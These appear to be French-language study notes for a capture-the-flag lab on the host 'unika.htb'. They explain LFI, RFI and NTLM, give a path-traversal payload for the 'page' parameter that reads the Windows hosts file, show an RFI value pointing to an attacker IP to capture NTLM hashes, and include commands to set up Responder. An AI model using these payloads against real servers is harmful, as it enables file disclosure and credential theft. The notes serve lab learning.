### Ip Machine:
---

```
10.129.196.199
```
quand on essaye d'entrer dans le site en utilisant l'IP, on est dirigé vers un serveur qui s'appelle : **unika.htb**. Mais pour pouvoir y acceder depuis le navigateur il faut d'abord éxecuter la commande :
```
echo "target-IP unika.htb" | sudo tee -a /etc/hosts
```


.Le nom du paramètre URL utilisé pour charger différentes versions linguistiques de la page Web est : **page**

### LFI(Local File Include):
---
vulnérabilité web qui permet à un attaquant d’inclure et de lire des fichiers locaux du serveur en manipulant des entrées non sécurisées. Elle est souvent exploitée lorsque des applications utilisent des fonctions comme **`include()`**, **`require()`**, ou leurs variantes en PHP, sans validation correcte des entrées utilisateur.

**-exemple d'exploitation LFI pour le paramètre *page***: ../../../../../../../../windows/system32/drivers/etc/hosts

![[Pasted image 20250215223157.png]]

### RFI(Remote File Inclusion):
---
permet à un attaquant d'inclure un fichier distant (hébergé sur un serveur contrôlé par l'attaquant) dans une application web vulnérable. Cela est souvent dû à une mauvaise validation d’un paramètre utilisé avec des fonctions comme **`include()`** ou **`require()`** en PHP.

**-Exemple :**//10.10.14.6/somefile

### NTLM(New Technology Lan Manager):
---
C'est un protocole d'authentification utilisé par Microsoft pour la connexion aux réseaux Windows. Il repose sur un mécanisme de challenge-réponse pour authentifier les utilisateurs sans transmettre directement leur mot de passe.

-**Vulnérable aux attaques Pass-the-Hash (PtH)**
-**Susceptible aux attaques de relai NTLM (NTLM Relay Attack)**
-**Moins sécurisé que Kerberos, qui est désormais préféré dans les environnements modernes**

-Il nous faut installer touts les utilité de **Responder dans la machine**:

```
git clone https://github.com/lgandx/Responder
```

-Vérifier si **Responder.conf** peut écouter des requêtes **SMB**:

![[Pasted image 20250215224113.png]]

-**-I**: flag utiliser dans **Responder** pour specifier une interface réseau

```
sudo python3 Responder.py -I tun1
```
